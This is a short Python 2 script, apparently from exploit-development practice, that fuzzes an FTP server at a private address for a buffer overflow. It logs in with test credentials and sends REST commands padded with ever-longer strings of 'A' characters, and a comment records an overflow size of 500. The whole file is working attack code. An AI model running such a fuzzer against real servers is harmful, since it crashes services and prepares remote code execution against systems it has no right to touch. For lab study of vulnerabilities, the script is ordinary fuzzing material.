import sys
import socket

IP = "192.168.0.134"
PORT = 21


# Checking BOF size.
# The buffer size is 500

buffer = ["A"]
counter = 100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for buf in buffer:
	# Connecting to service
	print "Trying with {0} size".format(len(buf))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP,PORT))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS test\r\n')
	s.recv(1024)
	s.send('REST ' + buf + '\r\n')
	s.close()
